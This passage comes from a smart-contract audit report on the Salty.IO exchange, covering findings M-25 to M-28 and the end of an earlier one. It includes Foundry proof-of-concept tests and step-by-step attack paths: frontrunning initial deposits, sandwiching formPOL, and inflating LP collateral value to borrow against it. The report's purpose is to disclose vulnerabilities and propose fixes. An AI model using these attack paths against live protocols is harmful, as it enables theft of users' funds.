The likelihood of this bug occuring is low to medium, because it is dependant on failure in the WETH to Salt swap in step 5 which might occur if the pool was maliciously targeted or in extreme market conditions and volatility. However the impact is medium to high since pool liquidity providers will most certainly lose out on arbitrage profits(dependant the frequency of calling upkeep and trading dynamics, this could potentially be a large arbitrage profit), so given the potential for lost rewards, a rating of atleast high here is appropriate.

### Proof of Concept

The POC below succesfully simulates this situation, by making sure the attempt to swap WETH to Salt in step 5 fails. this is done by manipulating pool reserve amounts. There are two versions, one with call to step 6 and one without.The one without the call to step6 more clearly displays the 'loss' in rewards.

</details>

    function testSuccessStep5NoStep6() public
    	{
    	_setupLiquidity();
    	vm.warp( block.timestamp + 1 days );
    	_generateArbitrageProfits(true);

    	// stakingRewardsEmitter and liquidityRewardsEmitter have initial bootstrapping rewards
    	bytes32[] memory poolIDsB = new bytes32[](1);
    	poolIDsB[0] = PoolUtils._poolID(salt, usds);
    	uint256 initialRewardsB = liquidityRewardsEmitter.pendingRewardsForPools(poolIDsB)[0];

    	bool errorRaised = false;

    	//Mimic depositing arbitrage profits.
    	vm.prank(DEPLOYER);
    	weth.transfer(address(dao), 700 ether);
    	

    	vm.startPrank(address(dao));
    	weth.approve(address(pools), 700 ether );
    	pools.deposit( weth, 700 ether);
    	vm.stopPrank();

    	assertEq( salt.balanceOf(address(saltRewards)), 0 );

        vm.startPrank(address(upkeep));
    	ITestUpkeep(address(upkeep)).step2(alice);
    	ITestUpkeep(address(upkeep)).step3();
    	ITestUpkeep(address(upkeep)).step4();
    	try ITestUpkeep(address(upkeep)).step5() {}
    	catch (bytes memory error) {errorRaised = true; }
    	assertEq( errorRaised, true ); // proves that the swap from WETH to Salt in step 5 failed

    	// No SALT was sent to SaltRewards, because swap from WETH to SALT failed due to low reserves.
    	// which means arbitrage profits reward wont be sent to pools
    	assertEq( salt.balanceOf(address(saltRewards)), 0);

    	// Check that the rewards were recorded in storage
    	bool poolsHaveProfit = false;
    	uint256[] memory profitsForPools = IPoolStats(address(pools)).profitsForWhitelistedPools();
    	for( uint256 i = 0; i < profitsForPools.length; i++ ) {
    		console.log("pool profit for pool before:", i);
    		console.log(profitsForPools[i]);
    		if (profitsForPools[i] > 0){
    			poolsHaveProfit = true;
    		}
    		
    	}
    	assertEq( poolsHaveProfit, true );

    	ITestUpkeep(address(upkeep)).step7();
    	bool poolsDontHaveProfit = false;
    	// Check that the rewards for pools no longer recorded in storage
    	uint256[] memory profitsForPools2 = IPoolStats(address(pools)).profitsForWhitelistedPools();
    	for( uint256 i = 0; i < profitsForPools2.length; i++ ) {
    		console.log("pool profit for pool:", i);
    		console.log(profitsForPools2[i]);
    		if (profitsForPools2[i] > 0){
    			poolsDontHaveProfit = true;
    		}
    	}
        // test proves that in the case a pool doesnt have enough reserve to swap the arbitrage profits to SALT, the upkeep sequence
    	// can lead to arbitrage profits being cleared from storage, effectively meaning they can not be distributed
    	// to anyone, hence lost funds. ie  the pools that have taken part in generating recent arbitrage profits so that those pools 
    	// will be unable to can receive proportional pending rewards on the next call to performUpkeep(), because their record has been cleared from storage.
    	assertEq( poolsDontHaveProfit, false );

    	bytes32[] memory poolIDs = new bytes32[](4);
    	poolIDs[0] = PoolUtils._poolID(salt,weth);
    	poolIDs[1] = PoolUtils._poolID(salt,wbtc);
    	poolIDs[2] = PoolUtils._poolID(wbtc,weth);
    	poolIDs[3] = PoolUtils._poolID(salt,usds);

    	// Check that rewards were not sentto the three pools involved in generating the test arbitrage
    	assertEq( liquidityRewardsEmitter.pendingRewardsForPools(poolIDs)[0], initialRewardsB );
    	assertEq( liquidityRewardsEmitter.pendingRewardsForPools(poolIDs)[1], initialRewardsB );
    	assertEq( liquidityRewardsEmitter.pendingRewardsForPools(poolIDs)[2], initialRewardsB );

    	vm.stopPrank();
    	}



        function testSuccessStep5Withstep6() public
    	{
    	_setupLiquidity();
    	vm.warp( block.timestamp + 1 days );
    	_generateArbitrageProfits(true);

    	// stakingRewardsEmitter and liquidityRewardsEmitter have initial bootstrapping rewards
    	bytes32[] memory poolIDsB = new bytes32[](1);
    	poolIDsB[0] = PoolUtils._poolID(salt, usds);
    	uint256 initialRewardsB = liquidityRewardsEmitter.pendingRewardsForPools(poolIDsB)[0];

    	bool errorRaised = false;

    	//Mimic depositing arbitrage profits.
    	vm.prank(DEPLOYER);
    	weth.transfer(address(dao), 700 ether);
    	

    	vm.startPrank(address(dao));
    	weth.approve(address(pools), 700 ether );
    	pools.deposit( weth, 700 ether);
    	vm.stopPrank();

    	assertEq( salt.balanceOf(address(saltRewards)), 0 );

        vm.startPrank(address(upkeep));
    	ITestUpkeep(address(upkeep)).step2(alice);
    	ITestUpkeep(address(upkeep)).step3();
    	ITestUpkeep(address(upkeep)).step4();
    	try ITestUpkeep(address(upkeep)).step5() {}
    	catch (bytes memory error) {errorRaised = true; }
    	assertEq( errorRaised, true ); // proves that the swap from WETH to Salt in step 5 failed

    	// No SALT was sent to SaltRewards, because swap from WETH to SALT failed due to low reserves.
    	// which means salt rewards related to arbitrage profits reward wont be sent to pools
    	assertEq( salt.balanceOf(address(saltRewards)), 0);

    	// Check that the rewards were recorded in storage
    	bool poolsHaveProfit = false;
    	uint256[] memory profitsForPools = IPoolStats(address(pools)).profitsForWhitelistedPools();
    	for( uint256 i = 0; i < profitsForPools.length; i++ ) {
    		console.log("pool profit for pool before:", i);
    		console.log(profitsForPools[i]);
    		if (profitsForPools[i] > 0){
    			poolsHaveProfit = true;
    		}
    		
    	}
    	assertEq( poolsHaveProfit, true );


    	ITestUpkeep(address(upkeep)).step6();
    	ITestUpkeep(address(upkeep)).step7();
    	bool poolsDontHaveProfit = false;
    	// Check that the rewards for pools no longer recorded in storage
    	uint256[] memory profitsForPools2 = IPoolStats(address(pools)).profitsForWhitelistedPools();
    	for( uint256 i = 0; i < profitsForPools2.length; i++ ) {
    		console.log("pool profit for pool:", i);
    		console.log(profitsForPools2[i]);
    		if (profitsForPools2[i] > 0){
    			poolsDontHaveProfit = true;
    		}
    	}
        // test proves that in the case a pool doesnt have enough reserve to swap the arbitrage profits to SALT, the upkeep sequence
    	// can lead to arbitrage profits being cleared from storage, effectively meaning they can not be distributed
    	// to anyone, hence lost funds. ie  the pools that have taken part in generating recent arbitrage profits so that those pools 
    	// will be unable to can receive proportional pending rewards on the next call to performUpkeep(), because their record has been cleared from storage.
    	assertEq( poolsDontHaveProfit, false );


    	vm.stopPrank();
    	}

     function _setupLiquidity() internal
    	{
    	vm.prank(address(collateralAndLiquidity));
    	usds.mintTo(DEPLOYER, 100000 ether );

    	vm.prank(address(teamVestingWallet));
    	salt.transfer(DEPLOYER, 100000 ether );

    	vm.startPrank(DEPLOYER);
    	weth.approve( address(collateralAndLiquidity), 300000 ether);
    	usds.approve( address(collateralAndLiquidity), 100000 ether);
    	dai.approve( address(collateralAndLiquidity), 100000 ether);
    	salt.approve( address(collateralAndLiquidity), 100000 ether);

    	collateralAndLiquidity.depositLiquidityAndIncreaseShare(weth, usds, 100000 ether, 100000 ether, 0, block.timestamp, false);
    	collateralAndLiquidity.depositLiquidityAndIncreaseShare(weth, dai, 100000 ether, 100000 ether, 0, block.timestamp, false);
    	collateralAndLiquidity.depositLiquidityAndIncreaseShare(weth, salt, 100000000000 wei, 100000000000 wei, 0, block.timestamp, false);

    	vm.stopPrank();
    	}

     function _generateArbitrageProfits( bool despositSaltUSDS ) internal
    	{
    	/// Pull some SALT from the daoVestingWallet
    	vm.prank(address(daoVestingWallet));
    	salt.transfer(DEPLOYER, 100000 ether);

    	// Mint some USDS
    	vm.prank(address(collateralAndLiquidity));
    	usds.mintTo(DEPLOYER, 1000 ether);

    	vm.startPrank(DEPLOYER);
    	salt.approve(address(collateralAndLiquidity), type(uint256).max);
    	wbtc.approve(address(collateralAndLiquidity), type(uint256).max);
    	weth.approve(address(collateralAndLiquidity), type(uint256).max);
    	wbtc.approve(address(collateralAndLiquidity), type(uint256).max);
    	weth.approve(address(collateralAndLiquidity), type(uint256).max);

    	if ( despositSaltUSDS )
    		//collateralAndLiquidity.depositLiquidityAndIncreaseShare( salt, weth, 1000 ether, 1000 ether, 0, block.timestamp, false );
    		collateralAndLiquidity.depositLiquidityAndIncreaseShare( salt, weth, 100000000000 wei, 100000000000 wei, 0, block.timestamp, false );

    	collateralAndLiquidity.depositLiquidityAndIncreaseShare( wbtc, salt, 1000 * 10**8, 1000 ether, 0, block.timestamp, false );
    	collateralAndLiquidity.depositCollateralAndIncreaseShare( 1000 * 10**8, 1000 ether, 0, block.timestamp, false );

    	salt.approve(address(pools), type(uint256).max);
    	wbtc.approve(address(pools), type(uint256).max);
    	weth.approve(address(pools), type(uint256).max);
    	vm.stopPrank();

    	// Place some sample trades to create arbitrage profits
    	_swapToGenerateProfits();
    	}

</details>

### Recommended Mitigation Steps

Given the interdependencies between step 5 and step 7, a failure in step 5 due to a failed swap implies that step 7 should also not proceed because its calculations are dependent on the success of step 5. Appropriate logic should be added to handle this.

**[othernet-global (Salty.IO) disputed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/239#issuecomment-1933589958):**
 > It is acceptable for step 7 to not distribute rewards if step 5 has not functioned correctly.  Assuming step 5 functions correctly later, then step 7 will function correctly later as well.

**[Picodes (Judge) commented](https://github.com/code-423n4/2024-01-salty-findings/issues/239#issuecomment-1952516157):**
 > It seems to me that rewards are just delayed here as the step 5 uses the contract's balance so there is no issue.

**[genesiscrew (Warden) commented](https://github.com/code-423n4/2024-01-salty-findings/issues/239#issuecomment-1958800791):**
 > There is no guarantee that the rewards that were delayed will be later distributed fairly to the pools that generated them. This is due to the fact that in the case of distribution failure, profits assigned to pools are cleared from storage as is shown in the POC. 
> 
> Imagine pool A accumulated most of the rewards in interval 1, reward distribution fails, in interval two pool B accumulated most of the rewards, they will be rewarded more than they should be because the balance will include rewards from interval 1 and interval 2. 
> 
> https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/rewards/SaltRewards.sol#L68
> 
> The line above shows how rewards are distributed for each pool. in this formula profitsForPools[i] and totalProfits will not  factor in delayed rewards. while liquidityRewardsAmount will because its based off contract balance. so this means pool B in interval 2 will be effectively earning more rewards than it should, hence lost rewards for pool A.

**[Picodes (Judge) commented](https://github.com/code-423n4/2024-01-salty-findings/issues/239#issuecomment-1963481998):**
 > Thanks @genesiscrew. On second read it seems you are right. We could imagine a scenario where an attacker forces step 5 to fail to clear the storage and then distribute profits to a pool he is in. But the scenario wouldn't be simple because you need to take into account the fact that automatic arbitrages increases the cost of manipulating pool reserves.

***

## [[M-25] Incorrect assumption in PoolMath.sol can cause underflow when zapping is used](https://github.com/code-423n4/2024-01-salty-findings/issues/232)
*Submitted by [t0x1c](https://github.com/code-423n4/2024-01-salty-findings/issues/232), also found by [Draiakoo](https://github.com/code-423n4/2024-01-salty-findings/issues/707) and [AgileJune](https://github.com/code-423n4/2024-01-salty-findings/issues/594)*

[\_zapSwapAmount()](https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/PoolMath.sol#L191-L192) assumes that:

```js
191:		// r1 * z0 guaranteed to be greater than r0 * z1 per the conditional check in _determineZapSwapAmount
192:        uint256 C = r0 * ( r1 * z0 - r0 * z1 ) / ( r1 + z1 );
```

The protocol's assumption of `r1 * z0 guaranteed to be greater than r0 * z1` is based on the following check in [\_determineZapSwapAmount()](https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/PoolMath.sol#L214-L220):

```js
214:		// zapAmountA / zapAmountB exceeds the ratio of reserveA / reserveB? - meaning too much zapAmountA
215:		if ( zapAmountA * reserveB > reserveA * zapAmountB )
216:			(swapAmountA, swapAmountB) = (_zapSwapAmount( reserveA, reserveB, zapAmountA, zapAmountB ), 0);
217:
218:		// zapAmountA / zapAmountB is less than the ratio of reserveA / reserveB? - meaning too much zapAmountB
219:		if ( zapAmountA * reserveB < reserveA * zapAmountB )
220:			(swapAmountA, swapAmountB) = (0, _zapSwapAmount( reserveB, reserveA, zapAmountB, zapAmountA ));
```

The assumption would had been true for all cases if not for this piece of logic inside [\_zapSwapAmount()#L158-L168](https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/PoolMath.sol#L158-L168) which right shifts the arguments if the `maximumMSB` is greater than 80:

```js
    	// Assumes the largest number has more than 80 bits - but if not then shifts zero effectively as a straight assignment.
    	// C will be calculated as: C = r0 * ( r1 * z0 - r0 * z1 ) / ( r1 + z1 );
    	// Multiplying three 80 bit numbers will yield 240 bits - within the 256 bit limit.
		if ( maximumMSB > 80 )
			shift = maximumMSB - 80;

    	// Normalize the inputs to 80 bits.
    	uint256 r0 = reserve0 >> shift;
		uint256 r1 = reserve1 >> shift;
		uint256 z0 = zapAmount0 >> shift;
		uint256 z1 = zapAmount1 >> shift;
```

This can lead to `z0` being reduced to `0` and hence causing underflow on [L192](https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/PoolMath.sol#LL192). <br>

Since `_determineZapSwapAmount()` is internally called whenever `depositLiquidityAndIncreaseShare()` is called with `useZapping = true`, it will cause a revert when a situation like the following exists:

```js
        uint256 reserveA = 1500000000;
        uint256 reserveB = 2000000000 ether;
        uint256 zapAmountA = 150;
        uint256 zapAmountB = 100 ether;
```

`maximumMSB` in this case is `90` (for `reserveB`) and also an excess of `zapAmountA` is being provided as compared to the existing reserve ratio. Hence, right shift by `90 - 80 = 10` bits will occur resulting `z0` to be `0`.

### Proof of Concept

Create a new file `src/stable/tests/BugPoolMath.t.sol` and add the following code. Run it via `forge test -vv --mt test_poolMath` to see the test revert:

```js
// SPDX-License-Identifier: Unlicensed
pragma solidity =0.8.22;

import "../../pools/PoolMath.sol";
import { console, Test } from "forge-std/Test.sol";

contract BugPoolMath is Test
{
    function test_poolMath() public view {
        uint256 reserveA = 1500000000;
        uint256 reserveB = 2000000000 ether;
        uint256 zapAmountA = 150;
        uint256 zapAmountB = 100 ether;

        (uint256 swapAmountA, uint256 swapAmountB) = PoolMath._determineZapSwapAmount(reserveA, reserveB, zapAmountA, zapAmountB);
        console.log("swapAmountA = %s, swapAmountB = %s", swapAmountA, swapAmountB);
    }
}
```

### Tools used

Foundry

### Recommended Mitigation Steps

Make sure to check the assertion again:

<details>

```diff
    function _zapSwapAmount( uint256 reserve0, uint256 reserve1, uint256 zapAmount0, uint256 zapAmount1 ) internal pure returns (uint256 swapAmount)
    	{
    	uint256 maximumMSB = _maximumMSB( reserve0, reserve1, zapAmount0, zapAmount1);

		uint256 shift = 0;

    	// Assumes the largest number has more than 80 bits - but if not then shifts zero effectively as a straight assignment.
    	// C will be calculated as: C = r0 * ( r1 * z0 - r0 * z1 ) / ( r1 + z1 );
    	// Multiplying three 80 bit numbers will yield 240 bits - within the 256 bit limit.
		if ( maximumMSB > 80 )
			shift = maximumMSB - 80;

    	// Normalize the inputs to 80 bits.
    	uint256 r0 = reserve0 >> shift;
		uint256 r1 = reserve1 >> shift;
		uint256 z0 = zapAmount0 >> shift;
		uint256 z1 = zapAmount1 >> shift;

		// In order to swap and zap, require that the reduced precision reserves and one of the zapAmounts exceed DUST.
		// Otherwise their value was too small and was crushed by the above precision reduction and we should just return swapAmounts of zero so that default addLiquidity will be attempted without a preceding swap.
        if ( r0 < PoolUtils.DUST)
        	return 0;

        if ( r1 < PoolUtils.DUST)
        	return 0;

        if ( z0 < PoolUtils.DUST)
        if ( z1 < PoolUtils.DUST)
        	return 0;

        // Components of the quadratic formula mentioned in the initial comment block: x = [-B + sqrt(B^2 - 4AC)] / 2A
		uint256 A = 1;
        uint256 B = 2 * r0;

		// Here for reference
//        uint256 C = r0 * ( r0 * z1 - r1 * z0 ) / ( r1 + z1 );
//        uint256 discriminant = B * B - 4 * A * C;

-		// Negate C (from above) and add instead of subtract.
-		// r1 * z0 guaranteed to be greater than r0 * z1 per the conditional check in _determineZapSwapAmount
-       uint256 C = r0 * ( r1 * z0 - r0 * z1 ) / ( r1 + z1 );
-       uint256 discriminant = B * B + 4 * A * C;
+       uint256 C;
+       uint256 discriminant;
+       if ((r1 * z0) >= (r0 * z1)) {
+           C = r0 * ( r1 * z0 - r0 * z1 ) / ( r1 + z1 );
+           discriminant = B * B + 4 * A * C;
+       } else {
+           C = r0 * ( r0 * z1 - r1 * z0 ) / ( r1 + z1 );
+           discriminant = B * B - 4 * A * C;
+       }

        // Compute the square root of the discriminant.
        uint256 sqrtDiscriminant = Math.sqrt(discriminant);

		// Safety check: make sure B is not greater than sqrtDiscriminant
		if ( B > sqrtDiscriminant )
			return 0;

        // Only use the positive sqrt of the discriminant from: x = (-B +/- sqrtDiscriminant) / 2A
		swapAmount = ( sqrtDiscriminant - B ) / ( 2 * A );

		// Denormalize from the 80 bit representation
		swapAmount <<= shift;
    	}
```
</details>

**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/232#issuecomment-1947945544):**
 > Zapping no longer uses scaling:
> 
> https://github.com/othernet-global/salty-io/commit/44320a8cc9b94de433e437e025f072aa850b995a

**Status:** Mitigation confirmed. Full details in reports from [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/106), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/86), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/22).


***

## [[M-26] formPOL lacks slippage and deadline protection](https://github.com/code-423n4/2024-01-salty-findings/issues/224)
*Submitted by [Banditx0x](https://github.com/code-423n4/2024-01-salty-findings/issues/224), also found by [Hajime](https://github.com/code-423n4/2024-01-salty-findings/issues/899), [oakcobalt](https://github.com/code-423n4/2024-01-salty-findings/issues/876), [0xGreyWolf](https://github.com/code-423n4/2024-01-salty-findings/issues/831), [Tripathi](https://github.com/code-423n4/2024-01-salty-findings/issues/826), [PENGUN](https://github.com/code-423n4/2024-01-salty-findings/issues/728), [Krace](https://github.com/code-423n4/2024-01-salty-findings/issues/691), 00xSEV ([1](https://github.com/code-423n4/2024-01-salty-findings/issues/642), [2](https://github.com/code-423n4/2024-01-salty-findings/issues/615)), [0xmuxyz](https://github.com/code-423n4/2024-01-salty-findings/issues/605), b0g0 ([1](https://github.com/code-423n4/2024-01-salty-findings/issues/353), [2](https://github.com/code-423n4/2024-01-salty-findings/issues/236)), [Jorgect](https://github.com/code-423n4/2024-01-salty-findings/issues/344), [Kaysoft](https://github.com/code-423n4/2024-01-salty-findings/issues/256), and [djxploit](https://github.com/code-423n4/2024-01-salty-findings/issues/231)*

<https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAO.sol#L316> 

<https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAO.sol#L360>

formPOL can be vulnerable to a well known liquidity deposit sandwich attack causing loss of funds for the protocol.

### Proof of Concept

In `formPOL`, there are no slippage parameters when calling `depositLiquidityAndIncreaseShare`

All liquidity deposits in a Uniswap v2 style pool can be frontrun by this sequence of steps:

1.  attacker pushes pool away from correct ratio
2.  victims liquidity deposit goes through at wrong ratio
3.  attacker sells tokens into the new liquidity for a profit

Liquidity withdrawals in a `x * y = k` pool are actually rarely profitable to frontrun attack (it requires certain edge cases), as the same sequence actually loses money if it is a liquidity withdrawals, which is why `withdrawPOL` wasn't explicitly mentioned. However, this issue also applies to `withdrawPOL` and adding slippage protection in that function could be an extra safety measure.

### Recommended Mitigation Steps

`formPOL` should have some form of slippage protection. This could be based off a maximum deviation off some other price feed such a Uniswap v3 TWAP or Chainlink pricefeed. If the pool reserves deviates too much from the expected ratio from the price feed, `formPOL` should revert.

**[othernet-global (Salty.IO) acknowledged and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/224#issuecomment-1933560340):**
 > The automatic arbitrage on the DEX provides some built in protection against front running as the attacker is not able to move in and out without experiencing friction from the arbitrage itself.
> 
> Simulations (see Sandwich.t.sol) show that when sandwich attacks are used on Salty, the arbitrage earned by the protocol sometimes exceeds any amount lost due to the sandwich attack itself. The actual swap loss (taking arbitrage profits generated by the sandwich swaps into account) is dependent on the multiple pool reserves involved in the arbitrage (which are encouraged by rewards distribution to create more reasonable arbitrage opportunities).

**[Picodes (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/224#issuecomment-1956986114):**
 > Regrouping issues about missing slippage checks here as the root cause is the same - the assumption that AAA is enough to prevent MEV bots from sandwiching maintenance transactions doesn't always hold.

**[othernet-global (Salty.IO) commented](https://github.com/code-423n4/2024-01-salty-findings/issues/224#issuecomment-1960660588):**
 > POL has been removed from the protocol:
> 
> [eaf40ef0fa27314c6e674db6830990df68e5d70e](https://github.com/othernet-global/salty-io/commit/eaf40ef0fa27314c6e674db6830990df68e5d70e)
> https://github.com/othernet-global/salty-io/commit/8e3231d3f444e9851881d642d6dd03021fade5ed 

**Status:** Mitigation confirmed. Full details in reports from [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/87), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/107), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/23).

***

## [[M-27] Attacker Can Inflate LP Position Value To Create a Bad Debt Loan](https://github.com/code-423n4/2024-01-salty-findings/issues/222)
*Submitted by [Banditx0x](https://github.com/code-423n4/2024-01-salty-findings/issues/222), also found by [Arz](https://github.com/code-423n4/2024-01-salty-findings/issues/945), [Infect3d](https://github.com/code-423n4/2024-01-salty-findings/issues/924), [Toshii](https://github.com/code-423n4/2024-01-salty-findings/issues/890), [Kalyan-Singh](https://github.com/code-423n4/2024-01-salty-findings/issues/879), [jasonxiale](https://github.com/code-423n4/2024-01-salty-findings/issues/858), [israeladelaja](https://github.com/code-423n4/2024-01-salty-findings/issues/542), [PENGUN](https://github.com/code-423n4/2024-01-salty-findings/issues/356), [a3yip6](https://github.com/code-423n4/2024-01-salty-findings/issues/292), [linmiaomiao](https://github.com/code-423n4/2024-01-salty-findings/issues/136), and [zhaojohnson](https://github.com/code-423n4/2024-01-salty-findings/issues/655)*

An attacker can inflate the value of liquidity through reserve ratio manipulation (even without manipulating the aggregated oracle) and take out a undercollateralized USDS loan.

### Proof of Concept

The value of a liquidity position in Salty is determined by:

1.  Checking the reserves of the pool/liquidity position (easy to manipulate)
2.  Valuing the tokens that comprise the liquidity position using an aggregated oracle (difficult to manipulate)

The only invariant enforced by the Uniswap v2 style AMM is $x \* y = k$. When the ratio of the tokens deviates from the "correct" ratio (where the ratio corresponds exactly to the correct value of the tokens), the liquidity will always be worth *more* , as calculated by the USD value of the individual tokens. There is the well known frontrunning attack on liquidity deposits which works based on this fact.

**Mathematical Example**

Let's go through a simple example. The pool is USDT-DAI, which is selected for simplicity as they are both tokens with 18 decimals and the oracle always returns a value of $1 for both tokens.

Currently there is 1e18 tokens in each pool, and let's say that the constant `k` is 1e36

Invariant formula: $x \* y = k$

$$
x = 1e18\\

y = 1e18\\

k = 1e36\\
$$

Let's do a swap which doubles the `x` variable and recalculate the corresponding y value:

$$
2e18  \* y = 1e36 \\

y = 0.5e18 \\

(x = 2e18)
$$

Now if we apply the correct oracle price of the tokens, which is `$1` per 1e18 wei, the value of the LP position is now worth (0.5 + 2) = `$2.5` , which is *more* , than the correct value of `$2`.

**An intuitive explanation of value inflation**

We know that large trades that push the reserve ratio away from the correct ratio loses money for traders (this money is gained by LP's). Trades that move the reserves towards the correct ratio gain money for traders (denominated by the "real value" of the tokens). This is the basis for AMM arbitrage and slippage attacks.

Pushing the price far from the correct reserve ratio can thus be seen as a temporary inflation of the price of the LP token when the token reserves are valued by their USD denominated price. This inflation comes from the manipulating trader losing a large amount of USD-denominated value.

Using this intuitive analogy, we can see why it's only possible to *inflate* the LP price and not deflate it. Pushing the reserve ratio towards the correct ratio is the method of deflating the USD-denominated value, however, the non-manipulated value should always approximately match the correct price, so it is not possible!

**Escalating to an Attack**

The LP token is used as collateral to borrow USDS, so we can inflate the LP price to borrow more than the liquidity position's real worth. The attacker can then dump the USDS and the whole USDS stablecoin will be undercollateralized and collapse.

**Does Automated Arbitrage Prevent Pool Manipulation?**

There is potential difficulty in manipulating the Salty pool due to the automated arbitrage. If there is enough liquidity in the pools in the `arbitragePath`, then the protocol will swap WETH to more WETH through the path which will rebalance the pool.

Note that this requires "enough liquidity" in the pool path. One could simply deposit a large amount liquidity in the pool being manipulated such that it holds far more token value than the other pools. Therefore, the WETH arbitrage will leave the pools imbalanced due to causing alot of price slippage in the smaller pools to create only a small price correction in the large pool.

Note that the potential profit of the attacker, which is to borrow all the USDS available at a massively discounted rate, is huge. Therefore the loss of losing to the WETH arbitrage would be negligible compared to how much they gain.

### Recommended Mitigation Steps

Valuing LP positions is tricky. Salty's current method is to "trust" the untrustworthy pool reserves. Instead, you could value the liquidity as if the ratio was at the correct ratio, rather than the current pool ratio. Here is an example of a protocol implementing this solution for Uniswap v3 positions:

<https://github.com/arcadia-finance/accounts-v2/blob/main/src/asset-modules/UniswapV3/UniswapV3AM.sol>

**[othernet-global (Salty.IO) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/222#issuecomment-1950476476):**
 > USDS has been removed from the exchange.
> 
> https://github.com/othernet-global/salty-io/commit/f3ff64a21449feb60a60c0d60721cfe2c24151c1

 > The stablecoin framework: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS have been removed:
> https://github.com/othernet-global/salty-io/commit/88b7fd1f3f5e037a155424a85275efd79f3e9bf9

**[Picodes (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/222#issuecomment-1950273733):**

> As shown by the report above, this attack seems valid but if arbitrage paths are properly configured the cost of attack is greater than usual. You'd need to either increase the size of the pool or manipulate the price of all the pools in the arbitrage paths at once to prevent arbitrages from happening. As it's still possible, the correct severity seems to be Medium under " leak value with a hypothetical attack path with stated assumptions, but external requirements.", the external requirements being that the cost of attack is smaller than the value extractable by borrowing USDS.

**Status:** Mitigation confirmed. Full details in reports from [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/109), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/88), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/24).

***

## [[M-28] MinShares Slippage Parameters Are Ineffective For Initial Deposit](https://github.com/code-423n4/2024-01-salty-findings/issues/221)
*Submitted by [Banditx0x](https://github.com/code-423n4/2024-01-salty-findings/issues/221), also found by [0xMango](https://github.com/code-423n4/2024-01-salty-findings/issues/120) and [jasonxiale](https://github.com/code-423n4/2024-01-salty-findings/issues/832)*

The first depositor in the AMM can lose the majority of their tokens to a frontrunning attack even if they set the correct minShares slippage parameters.

### Proof of Concept

**Summary**:

By using $x + y$ instead of $sqrt(x \* y)$ as the formula for determining the initial liquidity shares, minshares is no longer a effective slippage parameter for the first deposit as front running can change the shares minted even when the token ratio is the same.

**Explanation:**

Salty is a Uniswap style pool which maintains an $x \* y = k$ invaraint. However, the equation determining the initial liquidity amount is different from Uniswap v2

Here is Uniswap's:

$$
L = sqrt(x \* y)
$$

Here is Salty's (implemented in the `_addLiquidity` function):

$$
L = (x + y)
$$

Here is a quote from Uniswap's whitepaper:

*"Uniswap v2 initially mints shares equal to the geometric mean of the amounts, liquidity = sqrt(xy). This formula ensures that the value of a liquidity pool share at any time is essentially independent of the ratio at which liquidity was initially deposited… The above formula ensures that a liquidity pool share will never be worth less than the geometric mean of the reserves in that pool."*

Uniswap's liquidity formula is **path-independent**. As long as we know the `x` and `y` values in a deposit, we know that the liquidity will conform to the $L = sqrt(x \* y)$ formula.

Salty's formula is **not path independent**. The number of shares minted for a token deposit is affected by the initial liquidity deposit.

This is the basis for this attack.

The only slippage parameter used for depositing into the AMM is `minShares`. However, during the first deposit, an attacker can exploit the difference in the initial deposit liquidity equation $x + y$ and the invariant $x \* y$ to inflate the number of shares minted per token, and then use the inflated shares to set the AMM at an incorrect reserve ratio such that it can be arbitraged.

First let's examine a base case, where a user makes an initial deposit with correct `minShares` parameters:

User deposits 10000 DAI and 10000 USDT at a 1-1 reserve ratio. This is correct as they are both tokens with 18 decimals and value of `$1`.
Let's calculate the minShares slippage parameters they should set. During the first deposit they are depositing 10000 \* 1e18 wei of each token, so 1e22 wei. Liquidity minted is the sum of the 2 amounts (1e22 + 1e22). So liquidity minted = 2e22

Now let's examine how a frontrunner can inflate the shares so that the slippage parameter is no longer effective.

**Frontrunning Case, Step by step:**

1.  Attacker deposits at very imbalanced token ratios, eg 1e2 USDT and 1e18 DAI. This is to make the (x + y) result, or the liquidity shares, inflated relative to the correct deposit ratio.
2.  This sets `x * y = 1e20`
3.  So now we manipulate the x \* y back to be equal
4.  x = 1e10 and y = 1e10
5.  1e18 shares represents only 1e10 and 1e10 tokens
6.  If the user deposits now, they get far more shares. So **the user gets 1e8 (10 million) times more shares per wei of token deposited**.
7.  Depositing 1e22 of each token now yields `1e30` shares! In the example without frontrunning, they only minted `1e22` shares
8.  The example so far involves manipulating the AMM back to the "correct" reserve ratio to mint >1 million times more shares. However, this won't make any profit to the attacker yet. The attacker can use the "extra shares" to make the victims transaction go through even if they set "correct" minShares parameters based on the non-frontrunned case. So therefore, they manipulate the exchange-rate where 1 DAI = 5 USDT, and then even though less shares are minted, the extra shares minted from the attacker's share inflation ensures the shares minted does not drop below the `minShares` parameter.

### Recommended Mitigation Steps

Consider using `minAmount0` and `minAmount1` deposited into the AMM. This is how Uniswap V3 implements their slippage parameters.

Alternatively, using the same liquidity formula as Uniswap v2 - $L = sqrt(x \* y)$ will prevent this attack.

